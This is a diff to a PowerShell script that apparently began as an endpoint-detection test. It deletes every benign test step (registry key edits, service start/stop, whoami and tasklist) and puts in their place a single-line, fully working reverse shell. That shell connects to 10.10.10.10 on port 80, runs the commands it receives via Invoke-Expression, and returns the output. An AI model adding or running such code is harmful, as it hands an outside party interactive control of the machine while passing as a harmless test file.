@@ -1,13 +1,1 @@
-# Modify registry keys
-$regPath = "HKCU:\Software\EDRTestKey"
-New-Item -Path $regPath
-Set-ItemProperty -Path $regPath -Name "TestValue" -Value "EDRTest"
-Remove-Item -Path $regPath -Recurse
-
-# Start and stop a service
-$serviceName = "wuauserv" # Windows Update service
-Start-Service -Name $serviceName
-Stop-Service -Name $serviceName
-
-# Execute a suspicious command
-Invoke-Expression -Command "ping 127.0.0.1 -n 1; whoami; tasklist"
+$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
